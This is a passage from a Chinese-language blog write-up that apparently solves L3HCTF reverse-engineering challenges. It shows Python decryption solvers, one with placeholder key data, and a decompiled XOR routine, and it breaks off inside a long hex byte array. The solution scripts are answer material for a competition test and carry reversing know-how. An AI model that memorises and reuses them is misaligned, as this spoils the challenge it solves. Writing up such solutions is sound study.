</span></span><span class=line><span class=cl>        <span class=n>v11</span> <span class=o>=</span> <span class=p>((</span><span class=n>rolled_v11</span> <span class=o>&gt;&gt;</span> <span class=n>shift</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>rolled_v11</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=n>shift</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># --- 4. 逆转加密的第1步 (减法和异或) ---</span>
</span></span><span class=line><span class=cl>        <span class=n>term</span> <span class=o>=</span> <span class=p>(</span><span class=n>v11</span> <span class=o>-</span> <span class=n>ANON_DATA</span><span class=p>[</span><span class=n>some_index</span> <span class=o>+</span> <span class=mi>184</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>        <span class=n>original_byte</span> <span class=o>=</span> <span class=n>term</span> <span class=o>^</span> <span class=n>ANON_DATA</span><span class=p>[</span><span class=n>v10</span> <span class=o>+</span> <span class=mi>184</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>original_bytes</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>original_byte</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>original_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 执行解密 ---</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;正在执行解密算法...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;警告：解密所需关键数据 `ANON_DATA` 为占位符，结果无效！&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;请务必从程序中提取真实数据并替换 `ANON_DATA`。</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=n>solve</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;-&#34;</span> <span class=o>*</span> <span class=mi>40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] 解密出的字节 (Hex): </span><span class=si>{</span><span class=n>flag</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 尝试用UTF-8解码，如果失败则说明结果不是可打印字符</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[SUCCESS] 解密出的Flag: </span><span class=si>{</span><span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>UnicodeDecodeError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[INFO] 解密结果不是有效的UTF-8字符串。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[ERROR] 解密过程中发生错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=终焉之门>终焉之门</h2><p>两个代码块实现了对于隐藏代码的加密，有趣的是base64解多层是</p><p>flag is L3HCTF{&mldr;&mldr;.</p><p>wait what? how could it be so easy?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_7FF65DB11450</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// rcx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>a2</span> <span class=o>!=</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>a1</span> <span class=o>^=</span> <span class=mh>0x56u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>a2</span> <span class=o>!=</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>aVm0xd1ntuxlwa1</span><span class=p>[</span><span class=n>v3</span> <span class=o>%</span> <span class=mh>0x1CC</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>a1</span><span class=p>[</span><span class=n>v3</span><span class=o>++</span><span class=p>]</span> <span class=o>^=</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=p>(</span> <span class=n>v3</span> <span class=o>!=</span> <span class=n>a2</span> <span class=o>-</span> <span class=mi>1</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>写个脚本进行解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span 